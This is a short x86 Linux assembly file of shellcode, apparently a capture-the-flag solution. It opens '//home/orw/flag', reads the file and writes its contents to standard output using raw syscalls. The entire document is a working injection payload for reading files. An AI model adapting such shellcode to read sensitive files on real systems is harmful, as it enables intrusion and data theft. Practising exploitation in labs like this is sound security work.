section .text
	global _start

_start:
	xor ecx, ecx
	mul ecx

	mov al, 5
	push 0x00000000
	push 0x0067616c ; gal
	push 0x662f7772 ; f/wr
	push 0x6f2f656d ; o/em
	push 0x6f682f2f ; oh//
	mov ebx, esp
	int 80h

	xchg ebx, eax
	xchg eax, ecx
	mov al, 3
	mov ecx, esp
	mov edx, 0x0FFF
	inc edx
	int 80h

	xchg eax, edx
	mov bl, 1
	shr eax, 0x0a
	int 80h

	mov al, 1
	mov bl, 0
	int 80h

